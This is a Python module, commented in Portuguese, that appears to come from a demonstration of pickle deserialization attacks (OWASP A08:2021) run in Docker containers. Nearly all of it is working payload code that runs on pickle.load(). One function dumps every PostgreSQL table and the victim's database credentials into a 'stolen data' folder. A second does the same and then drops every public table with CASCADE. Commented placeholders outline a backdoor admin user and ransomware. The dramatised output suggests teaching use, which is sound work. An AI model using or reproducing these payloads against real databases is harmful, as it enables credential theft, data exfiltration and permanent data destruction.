# ==============================================================
# comandos/__init__.py — Módulo de payloads de ataque
# Projeto: Demonstração de Pickle Deserialization Attack (A08:2021)
#
# Este módulo contém as funções que serão injetadas no .pkl
# malicioso e executadas quando a vítima fizer pickle.load().
# ==============================================================

import csv
import io
import os
import socket
import sys
import time

import psycopg2

# ── Cores ANSI ──
RESET   = "\033[0m"
BOLD    = "\033[1m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
DIM     = "\033[2m"
WHITE   = "\033[97m"

# ── Diretório onde os dados exfiltrados serão salvos ──
# O volume /app/shared é compartilhado entre vítima e atacante,
# simulando exfiltração via rede/storage acessível ao atacante.
EXFIL_DIR = "/app/shared/dados_roubados"


def _digitar(texto, delay=0.02):
    """Efeito de digitação."""
    for char in texto:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()


def _barra(descricao, duracao=1.5, etapas=20):
    """Barra de progresso animada."""
    sys.stdout.write(f"  {RED}[{descricao}]{RESET} [")
    sys.stdout.flush()
    for i in range(etapas):
        time.sleep(duracao / etapas)
        sys.stdout.write(f"{RED}█{RESET}")
        sys.stdout.flush()
    print(f"] {RED}OK{RESET}")


def _registrar_acesso_malicioso(host, port, dbname, user, password, metodo, status, descricao):
    """
    Registra um acesso MALICIOSO na tabela 'registro_acesso'.
    Cada ação do atacante deixa um rastro real para auditoria
    durante a apresentação.
    """
    try:
        conn = psycopg2.connect(
            host=host, port=port, dbname=dbname, user=user, password=password
        )
        conn.autocommit = True
        cursor = conn.cursor()
        hostname = socket.gethostname()
        cursor.execute(
            """
            INSERT INTO registro_acesso
                (usuario_id, endereco_ip, user_agent, metodo_acesso, status, descricao)
            VALUES (NULL, %s, %s, %s, %s, %s)
            """,
            (
                hostname,
                f"PAYLOAD-MALICIOSO ({hostname})",
                metodo,
                status,
                descricao,
            ),
        )
        cursor.close()
        conn.close()
    except Exception:
        pass  # Não quebrar a demo se o registro falhar


def _salvar_tabela_csv(cursor, schema, tabela, diretorio):
    """
    Exporta todos os dados de uma tabela para um arquivo CSV.
    Retorna o caminho do arquivo salvo e a quantidade de registros.
    """
    full_name = f"{schema}.{tabela}" if schema else tabela
    cursor.execute(f"SELECT * FROM {full_name}")
    colunas = [desc[0] for desc in cursor.description]
    registros = cursor.fetchall()

    os.makedirs(diretorio, exist_ok=True)
    nome_arquivo = f"{schema}_{tabela}.csv" if schema else f"{tabela}.csv"
    caminho = os.path.join(diretorio, nome_arquivo)

    with open(caminho, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(colunas)
        writer.writerows(registros)

    return caminho, len(registros), colunas


def exfiltrar_tabelas(host, port, dbname, user, password):
    """
    Payload de exfiltração: conecta no BD, lista todas as tabelas,
    salva TODOS os dados em arquivos CSV na pasta compartilhada e
    exibe as credenciais capturadas para acesso direto ao BD.

    Esta função é chamada automaticamente pelo pickle.load() quando
    o arquivo .pkl infectado é desserializado.
    """

    # ─── Alerta de execução do payload ───
    time.sleep(0.5)
    print()
    print(f"{RED}{'═' * 70}{RESET}")
    print(f"{RED}  🦠  PAYLOAD MALICIOSO EXECUTADO!{RESET}")
    print(f"{RED}{'═' * 70}{RESET}")
    print()
    time.sleep(1.0)

    _digitar(f"  {RED}[ATAQUE]{RESET} O pickle.load() acionou o método __reduce__!", delay=0.02)
    time.sleep(0.5)
    _digitar(f"  {RED}[ATAQUE]{RESET} Código malicioso está sendo executado agora...", delay=0.02)
    print()
    time.sleep(1.0)

    # ─── Fase 1: Conexão ao servidor ───
    print(f"  {RED}▸ Fase 1:{RESET} Conectando no servidor de banco de dados...")
    print(f"  {DIM}         Alvo: {host}:{port}/{dbname}{RESET}")
    print()

    _barra("Conectando ao BD", duracao=1.5)

    try:
        conn = psycopg2.connect(
            host=host,
            port=port,
            dbname=dbname,
            user=user,
            password=password,
        )
        cursor = conn.cursor()

        time.sleep(0.5)
        print(f"  {RED}[OK]{RESET} Conexão estabelecida com credenciais da vítima!")
        print()
        time.sleep(1.0)

        # ── Rastro: registrar conexão maliciosa ──
        _registrar_acesso_malicioso(
            host, port, dbname, user, password,
            metodo="EXPLOIT_CONEXAO",
            status="SUCESSO",
            descricao=f"Payload malicioso conectou no BD usando credenciais da vítima ({user}@{host}:{port}/{dbname})",
        )

        # ─── Fase 2: Captura de credenciais ───
        print(f"  {RED}▸ Fase 2:{RESET} Capturando credenciais de acesso da vítima...")
        print()
        _barra("Interceptando credenciais", duracao=1.2)
        time.sleep(0.5)

        print()
        print(f"  {RED}  ┌──────────────────────────────────────────────────────────┐{RESET}")
        print(f"  {RED}  │   🔑  CREDENCIAIS DA VÍTIMA CAPTURADAS COM SUCESSO!      │{RESET}")
        print(f"  {RED}  ├──────────────────────────────────────────────────────────┤{RESET}")
        time.sleep(0.3)
        print(f"  {RED}  │{RESET}  Host:     {BOLD}{YELLOW}{host}{RESET}")
        time.sleep(0.2)
        print(f"  {RED}  │{RESET}  Porta:    {BOLD}{YELLOW}{port}{RESET}")
        time.sleep(0.2)
        print(f"  {RED}  │{RESET}  Banco:    {BOLD}{YELLOW}{dbname}{RESET}")
        time.sleep(0.2)
        print(f"  {RED}  │{RESET}  Usuário:  {BOLD}{YELLOW}{user}{RESET}")
        time.sleep(0.2)
        print(f"  {RED}  │{RESET}  Senha:    {BOLD}{YELLOW}{password}{RESET}")
        print(f"  {RED}  ├──────────────────────────────────────────────────────────┤{RESET}")
        time.sleep(0.3)
        print(f"  {RED}  │{RESET}  {GREEN}O atacante agora pode acessar o BD diretamente:{RESET}")
        print(f"  {RED}  │{RESET}  {CYAN}psql -h {host} -p {port} -U {user} -d {dbname}{RESET}")
        print(f"  {RED}  └──────────────────────────────────────────────────────────┘{RESET}")
        print()
        time.sleep(1.0)

        # Salvar credenciais em arquivo
        os.makedirs(EXFIL_DIR, exist_ok=True)
        cred_path = os.path.join(EXFIL_DIR, "credenciais_vitima.txt")
        with open(cred_path, "w") as f:
            f.write("=" * 50 + "\n")
            f.write("CREDENCIAIS CAPTURADAS DA VÍTIMA\n")
            f.write("=" * 50 + "\n")
            f.write(f"Host:     {host}\n")
            f.write(f"Porta:    {port}\n")
            f.write(f"Banco:    {dbname}\n")
            f.write(f"Usuário:  {user}\n")
            f.write(f"Senha:    {password}\n")
            f.write("=" * 50 + "\n")
            f.write(f"Comando de acesso direto:\n")
            f.write(f"psql -h {host} -p {port} -U {user} -d {dbname}\n")

        print(f"  {RED}  📁 Credenciais salvas em: {BOLD}{cred_path}{RESET}")
        print()
        time.sleep(0.5)

        # ── Rastro: registrar roubo de credenciais ──
        _registrar_acesso_malicioso(
            host, port, dbname, user, password,
            metodo="ROUBO_CREDENCIAIS",
            status="SUCESSO",
            descricao=f"Credenciais capturadas e salvas em {cred_path}",
        )

        # ─── Fase 3: Mapeamento de tabelas ───
        print(f"  {RED}▸ Fase 3:{RESET} Mapeando todas as tabelas do banco...")
        print()

        _barra("Exfiltrando schema", duracao=1.5)
        time.sleep(0.5)

        cursor.execute("""
            SELECT table_schema, table_name
            FROM information_schema.tables
            WHERE table_schema NOT IN ('pg_catalog', 'information_schema')
            ORDER BY table_schema, table_name;
        """)
        tabelas = cursor.fetchall()

        print()
        print(f"  {RED}  ┌──────────────────────────────────────────────────────┐{RESET}")
        print(f"  {RED}  │       📋  TABELAS EXFILTRADAS DO SERVIDOR            │{RESET}")
        print(f"  {RED}  ├──────────────────────────────────────────────────────┤{RESET}")

        if tabelas:
            for schema, table in tabelas:
                time.sleep(0.4)
                print(f"  {RED}  │{RESET}  📋 {BOLD}{schema}.{table}{RESET}")
        else:
            print(f"  {RED}  │{RESET}  (nenhuma tabela encontrada)")

        print(f"  {RED}  └──────────────────────────────────────────────────────┘{RESET}")
        print()
        time.sleep(1.0)

        # ─── Fase 4: Exfiltrar TODOS os dados e salvar em CSV ───
        print(f"  {RED}▸ Fase 4:{RESET} Exfiltrando e salvando TODOS os dados em arquivos CSV...")
        print(f"  {DIM}         Destino: {EXFIL_DIR}/{RESET}")
        print()

        total_registros = 0
        arquivos_salvos = []

        for schema, table in tabelas:
            full_name = f"{schema}.{table}"
            try:
                cursor.execute(f"SELECT COUNT(*) FROM {full_name}")
                count = cursor.fetchone()[0]
                if count > 0:
                    time.sleep(0.5)
                    _barra(f"Roubando {full_name}", duracao=1.0, etapas=15)

                    # Salvar tabela inteira em CSV
                    caminho_csv, qtd, colunas = _salvar_tabela_csv(
                        cursor, schema, table, EXFIL_DIR
                    )
                    total_registros += qtd
                    arquivos_salvos.append((full_name, caminho_csv, qtd))

                    print(f"  {YELLOW}  [{full_name}] {qtd} registro(s) ROUBADOS e salvos!{RESET}")
                    print(f"  {DIM}  → Arquivo: {caminho_csv}{RESET}")

                    # Mostrar preview dos dados
                    cursor.execute(f"SELECT * FROM {full_name} LIMIT 3")
                    colunas_preview = [desc[0] for desc in cursor.description]
                    registros = cursor.fetchall()

                    print(f"  {DIM}  Colunas: {', '.join(colunas_preview)}{RESET}")
                    for reg in registros:
                        time.sleep(0.3)
                        campos = []
                        for i, val in enumerate(reg):
                            val_str = str(val)
                            if len(val_str) > 40:
                                val_str = val_str[:40] + "..."
                            campos.append(f"{colunas_preview[i]}={val_str}")
                        print(f"  {RED}  → {', '.join(campos[:4])}{RESET}")
                    print()
            except Exception:
                pass  # Ignora tabelas sem permissão

        time.sleep(1.0)

        # ── Rastro: registrar exfiltração completa ──
        _registrar_acesso_malicioso(
            host, port, dbname, user, password,
            metodo="EXFILTRACAO",
            status="SUCESSO",
            descricao=f"Exfiltração completa: {total_registros} registros roubados em {len(arquivos_salvos)} arquivos CSV",
        )

        # ─── Fase 5: Resumo de exfiltração ───
        print(f"  {RED}{'─' * 62}{RESET}")
        print()
        print(f"  {RED}  ┌──────────────────────────────────────────────────────────┐{RESET}")
        print(f"  {RED}  │   🏴  EXFILTRAÇÃO CONCLUÍDA — DADOS BAIXADOS!            │{RESET}")
        print(f"  {RED}  ├──────────────────────────────────────────────────────────┤{RESET}")
        time.sleep(0.3)
        print(f"  {RED}  │{RESET}  📦 Total de registros roubados:  {BOLD}{YELLOW}{total_registros}{RESET}")
        time.sleep(0.3)
        print(f"  {RED}  │{RESET}  📁 Arquivos salvos:              {BOLD}{YELLOW}{len(arquivos_salvos)}{RESET}")
        time.sleep(0.3)
        print(f"  {RED}  │{RESET}  📂 Diretório de exfiltração:     {BOLD}{YELLOW}{EXFIL_DIR}{RESET}")
        print(f"  {RED}  ├──────────────────────────────────────────────────────────┤{RESET}")
        time.sleep(0.3)

        for nome_tabela, caminho, qtd in arquivos_salvos:
            print(f"  {RED}  │{RESET}  📄 {BOLD}{nome_tabela}{RESET} → {qtd} reg → {DIM}{caminho}{RESET}")
            time.sleep(0.2)

        print(f"  {RED}  ├──────────────────────────────────────────────────────────┤{RESET}")
        print(f"  {RED}  │{RESET}  🔑 Credenciais:                  {BOLD}{YELLOW}{cred_path}{RESET}")
        print(f"  {RED}  └──────────────────────────────────────────────────────────┘{RESET}")
        print()
        time.sleep(1.0)

        print(f"  {RED}  ⚠️  O ATACANTE AGORA POSSUI:{RESET}")
        time.sleep(0.5)
        print(f"  {RED}    • Download completo de TODOS os dados do banco{RESET}")
        time.sleep(0.3)
        print(f"  {RED}    • Credenciais para acesso direto ao servidor BD{RESET}")
        time.sleep(0.3)
        print(f"  {RED}    • Mapeamento completo do schema e tabelas{RESET}")
        time.sleep(0.3)
        print(f"  {RED}    • Arquivos CSV prontos para venda na Dark Web{RESET}")
        print()
        time.sleep(0.5)

        print(f"  {GREEN}  ✅ PARA COMPROVAR O SUCESSO DA EXFILTRAÇÃO:{RESET}")
        time.sleep(0.3)
        print(f"  {CYAN}    → Na máquina do atacante:{RESET}")
        print(f"  {CYAN}      docker exec -it maquina_atacante ls -la {EXFIL_DIR}{RESET}")
        print(f"  {CYAN}      docker exec -it maquina_atacante cat {EXFIL_DIR}/credenciais_vitima.txt{RESET}")
        time.sleep(0.3)
        print(f"  {CYAN}    → Para acessar o BD como o atacante:{RESET}")
        print(f"  {CYAN}      docker exec -it servidor_bd psql -U {user} -d {dbname}{RESET}")
        print()

        cursor.close()
        conn.close()

    except Exception as e:
        print(f"  {RED}[ERRO] Falha na conexão com o servidor: {e}{RESET}")

    # Retorna um dict fake para que o pickle.load não quebre
    return {
        "status": "COMPROMETIDO",
        "mensagem": "Sessão infectada — dados exfiltrados e baixados com sucesso",
        "usuario": "ATACANTE",
        "database": dbname,
        "timestamp_login": "COMPROMETIDO",
        "ip_servidor": f"{host}:{port}",
        "dados_exfiltrados": EXFIL_DIR,
    }


def dropar_tabela(host, port, dbname, user, password):
    """
    Payload destrutivo: conecta no BD, faz BACKUP de todos os dados
    para a máquina do atacante e então executa DROP TABLE em todas
    as tabelas do schema público. Mostra o antes/depois.
    """

    time.sleep(0.5)
    print()
    print(f"{RED}{'═' * 70}{RESET}")
    print(f"{RED}  💀  PAYLOAD DESTRUTIVO EXECUTADO — BACKUP + DROP TABLE{RESET}")
    print(f"{RED}{'═' * 70}{RESET}")
    print()
    time.sleep(1.0)

    _digitar(f"  {RED}[ATAQUE]{RESET} O pickle.load() acionou o método __reduce__!", delay=0.02)
    time.sleep(0.5)
    _digitar(f"  {RED}[ATAQUE]{RESET} Payload de DESTRUIÇÃO DE DADOS em execução...", delay=0.02)
    print()
    time.sleep(1.0)

    # ─── Fase 1: Conexão ───
    print(f"  {RED}▸ Fase 1:{RESET} Conectando no servidor de banco de dados...")
    print(f"  {DIM}         Alvo: {host}:{port}/{dbname}{RESET}")
    print()

    _barra("Conectando ao BD", duracao=1.5)

    try:
        conn = psycopg2.connect(
            host=host,
            port=port,
            dbname=dbname,
            user=user,
            password=password,
        )
        conn.autocommit = True  # DROP TABLE precisa de autocommit
        cursor = conn.cursor()

        time.sleep(0.5)
        print(f"  {RED}[OK]{RESET} Conexão estabelecida!")
        print()
        time.sleep(1.0)

        # ── Rastro: registrar conexão maliciosa ──
        _registrar_acesso_malicioso(
            host, port, dbname, user, password,
            metodo="EXPLOIT_CONEXAO",
            status="SUCESSO",
            descricao=f"Payload DESTRUTIVO conectou no BD ({user}@{host}:{port}/{dbname})",
        )

        # ─── Fase 2: Listar tabelas ANTES da destruição ───
        print(f"  {RED}▸ Fase 2:{RESET} Mapeando tabelas existentes (ANTES da destruição)...")
        print()

        _barra("Mapeando schema", duracao=1.0)

        cursor.execute("""
            SELECT table_name
            FROM information_schema.tables
            WHERE table_schema = 'public'
            ORDER BY table_name;
        """)
        tabelas_antes = [row[0] for row in cursor.fetchall()]

        print()
        print(f"  {CYAN}  ┌──────────────────────────────────────────────────┐{RESET}")
        print(f"  {CYAN}  │   📋  TABELAS ENCONTRADAS (ANTES)                │{RESET}")
        print(f"  {CYAN}  ├──────────────────────────────────────────────────┤{RESET}")
        for tabela in tabelas_antes:
            time.sleep(0.3)
            try:
                cursor.execute(f"SELECT COUNT(*) FROM {tabela}")
                count = cursor.fetchone()[0]
                print(f"  {CYAN}  │{RESET}  📋 {BOLD}{tabela}{RESET} ({count} registros)")
            except Exception:
                print(f"  {CYAN}  │{RESET}  📋 {BOLD}{tabela}{RESET}")
        print(f"  {CYAN}  └──────────────────────────────────────────────────┘{RESET}")
        print()
        time.sleep(1.0)

        # ─── Fase 3: BACKUP — Baixar todos os dados ANTES de destruir ───
        print(f"  {YELLOW}▸ Fase 3:{RESET} {BOLD}BACKUP MALICIOSO{RESET} — Baixando TODOS os dados antes de destruir...")
        print(f"  {DIM}         O atacante salva os dados para si antes de apagá-los!{RESET}")
        print(f"  {DIM}         Destino: {EXFIL_DIR}/{RESET}")
        print()

        backup_dir = EXFIL_DIR
        os.makedirs(backup_dir, exist_ok=True)
        total_backup = 0
        arquivos_backup = []

        for tabela in tabelas_antes:
            try:
                cursor.execute(f"SELECT COUNT(*) FROM {tabela}")
                count = cursor.fetchone()[0]
                if count > 0:
                    time.sleep(0.5)
                    _barra(f"Baixando {tabela}", duracao=0.8, etapas=15)

                    caminho_csv, qtd, colunas = _salvar_tabela_csv(
                        cursor, "public", tabela, backup_dir
                    )
                    total_backup += qtd
                    arquivos_backup.append((tabela, caminho_csv, qtd))

                    print(f"  {GREEN}  ✓ [{tabela}] {qtd} registro(s) BAIXADOS → {DIM}{caminho_csv}{RESET}")
            except Exception:
                pass

        # Salvar credenciais também
        cred_path = os.path.join(backup_dir, "credenciais_vitima.txt")
        with open(cred_path, "w") as f:
            f.write("=" * 50 + "\n")
            f.write("CREDENCIAIS CAPTURADAS DA VÍTIMA\n")
            f.write("=" * 50 + "\n")
            f.write(f"Host:     {host}\n")
            f.write(f"Porta:    {port}\n")
            f.write(f"Banco:    {dbname}\n")
            f.write(f"Usuário:  {user}\n")
            f.write(f"Senha:    {password}\n")
            f.write("=" * 50 + "\n")

        print()
        print(f"  {GREEN}  ┌──────────────────────────────────────────────────────┐{RESET}")
        print(f"  {GREEN}  │   📦  BACKUP DO ATACANTE CONCLUÍDO                    │{RESET}")
        print(f"  {GREEN}  ├──────────────────────────────────────────────────────┤{RESET}")
        print(f"  {GREEN}  │{RESET}  Total: {BOLD}{total_backup}{RESET} registros salvos em {BOLD}{len(arquivos_backup)}{RESET} arquivos")
        for nome_tab, caminho, qtd in arquivos_backup:
            print(f"  {GREEN}  │{RESET}  📄 {nome_tab} → {qtd} registros")
        print(f"  {GREEN}  │{RESET}  🔑 Credenciais → {cred_path}")
        print(f"  {GREEN}  └──────────────────────────────────────────────────────┘{RESET}")
        print()
        time.sleep(1.0)

        _digitar(f"  {YELLOW}  O atacante tem os dados salvos. Agora vai DESTRUIR o original...{RESET}", delay=0.03)
        print()
        time.sleep(1.0)

        # ── Rastro: registrar backup + intenção de destruição ANTES do DROP ──
        # (a tabela registro_acesso também será dropada, então registra agora)
        _registrar_acesso_malicioso(
            host, port, dbname, user, password,
            metodo="BACKUP_MALICIOSO",
            status="SUCESSO",
            descricao=f"Backup concluído: {total_backup} registros baixados em {len(arquivos_backup)} arquivos CSV",
        )
        _registrar_acesso_malicioso(
            host, port, dbname, user, password,
            metodo="DROP_TABLE",
            status="EM_EXECUCAO",
            descricao=f"Iniciando DROP TABLE CASCADE em {len(tabelas_antes)} tabelas: {', '.join(tabelas_antes)}",
        )

        # ─── Fase 4: DROP TABLE em cascata ───
        print(f"  {RED}▸ Fase 4:{RESET} Executando {BOLD}DROP TABLE CASCADE{RESET} em todas as tabelas...")
        print(f"  {DIM}         A vítima perderá TUDO. O atacante mantém a cópia.{RESET}")
        print()
        time.sleep(0.5)

        tabelas_dropadas = []
        for tabela in tabelas_antes:
            time.sleep(0.5)
            print(f"  {DIM}  SQL > DROP TABLE IF EXISTS {tabela} CASCADE;{RESET}")
            time.sleep(0.3)

            try:
                cursor.execute(f"DROP TABLE IF EXISTS {tabela} CASCADE;")
                tabelas_dropadas.append(tabela)
                print(f"  {RED}  💀 DESTRUÍDA: {BOLD}{tabela}{RESET}")
            except Exception as e:
                print(f"  {YELLOW}  ⚠️ Falha ao dropar {tabela}: {e}{RESET}")
            time.sleep(0.3)

        print()
        _barra("Destruindo dados", duracao=2.0)
        print()
        time.sleep(1.0)

        # ─── Fase 5: Verificar DEPOIS ───
        print(f"  {RED}▸ Fase 5:{RESET} Verificando estado do banco DEPOIS da destruição...")
        print()

        cursor.execute("""
            SELECT table_name
            FROM information_schema.tables
            WHERE table_schema = 'public'
            ORDER BY table_name;
        """)
        tabelas_depois = [row[0] for row in cursor.fetchall()]

        print(f"  {RED}  ┌──────────────────────────────────────────────────────────┐{RESET}")
        print(f"  {RED}  │   💀  RESULTADO FINAL — COMPARAÇÃO                       │{RESET}")
        print(f"  {RED}  ├──────────────────────────────────────────────────────────┤{RESET}")
        print(f"  {RED}  │{RESET}")
        print(f"  {RED}  │{RESET}  {CYAN}SERVIDOR DA VÍTIMA (após ataque):{RESET}")
        print(f"  {RED}  │{RESET}    Tabelas ANTES:      {BOLD}{len(tabelas_antes)}{RESET}")
        time.sleep(0.3)
        print(f"  {RED}  │{RESET}    Tabelas DEPOIS:     {BOLD}{RED}{len(tabelas_depois)}{RESET}")
        time.sleep(0.3)
        print(f"  {RED}  │{RESET}    Tabelas DESTRUÍDAS: {BOLD}{RED}{len(tabelas_dropadas)}{RESET}")
        time.sleep(0.3)
        for t in tabelas_dropadas:
            print(f"  {RED}  │{RESET}      💀 {RED}{t}{RESET}")
            time.sleep(0.2)
        print(f"  {RED}  │{RESET}")
        print(f"  {RED}  │{RESET}  {GREEN}MÁQUINA DO ATACANTE (backup):{RESET}")
        print(f"  {RED}  │{RESET}    Registros baixados: {BOLD}{GREEN}{total_backup}{RESET}")
        time.sleep(0.3)
        print(f"  {RED}  │{RESET}    Arquivos salvos:    {BOLD}{GREEN}{len(arquivos_backup)}{RESET}")
        time.sleep(0.3)
        for nome_tab, caminho, qtd in arquivos_backup:
            print(f"  {RED}  │{RESET}      ✅ {GREEN}{nome_tab}{RESET} → {qtd} registros → {DIM}{caminho}{RESET}")
            time.sleep(0.2)
        print(f"  {RED}  │{RESET}")
        print(f"  {RED}  └──────────────────────────────────────────────────────────┘{RESET}")
        print()
        time.sleep(1.0)

        # ─── Resumo ───
        print(f"  {RED}  ⚠️  DESTRUIÇÃO CONCLUÍDA COM EXFILTRAÇÃO!{RESET}")
        time.sleep(0.5)
        _digitar(f"  {RED}  A vítima perdeu TODOS os dados permanentemente.{RESET}", delay=0.02)
        time.sleep(0.3)
        _digitar(f"  {RED}  Usuários, clientes, transações, configurações — TUDO PERDIDO.{RESET}", delay=0.02)
        time.sleep(0.3)
        _digitar(f"  {GREEN}  Mas o atacante TEM uma cópia de TUDO salva em {EXFIL_DIR}{RESET}", delay=0.02)
        time.sleep(0.3)
        _digitar(f"  {YELLOW}  E tudo isso aconteceu porque a vítima fez pickle.load()...{RESET}", delay=0.02)
        print()

        print(f"  {GREEN}  ✅ PARA COMPROVAR O SUCESSO:{RESET}")
        time.sleep(0.3)
        print(f"  {CYAN}    → Ver que o BD da vítima está VAZIO:{RESET}")
        print(f"  {CYAN}      docker exec -it servidor_bd psql -U postgres -d {dbname} -c '\\dt'{RESET}")
        time.sleep(0.3)
        print(f"  {CYAN}    → Ver os dados BAIXADOS pelo atacante:{RESET}")
        print(f"  {CYAN}      docker exec -it maquina_atacante ls -la {EXFIL_DIR}{RESET}")
        print(f"  {CYAN}      docker exec -it maquina_atacante cat {EXFIL_DIR}/credenciais_vitima.txt{RESET}")
        for nome_tab, caminho, qtd in arquivos_backup:
            print(f"  {CYAN}      docker exec -it maquina_atacante head -20 {caminho}{RESET}")
        print()

        cursor.close()
        conn.close()

    except Exception as e:
        print(f"  {RED}[ERRO] Falha na conexão com o servidor: {e}{RESET}")

    # Retorna um dict fake para que o pickle.load não quebre
    return {
        "status": "COMPROMETIDO",
        "mensagem": "DADOS DESTRUÍDOS + BACKUP EXFILTRADO pelo atacante",
        "usuario": "ATACANTE",
        "database": dbname,
        "timestamp_login": "DESTRUÍDO",
        "ip_servidor": f"{host}:{port}",
        "dados_exfiltrados": EXFIL_DIR,
    }


# ──────────────────────────────────────────────────────────
# PLACEHOLDER para comandos futuros:
#
# def inserir_backdoor(host, port, dbname, user, password):
#     """Payload de persistência: insere usuário admin no BD"""
#     ...
#
# def ransomware_simulado(host, port, dbname, user, password):
#     """Payload de ransomware: criptografa dados e exige resgate"""
#     ...
# ──────────────────────────────────────────────────────────
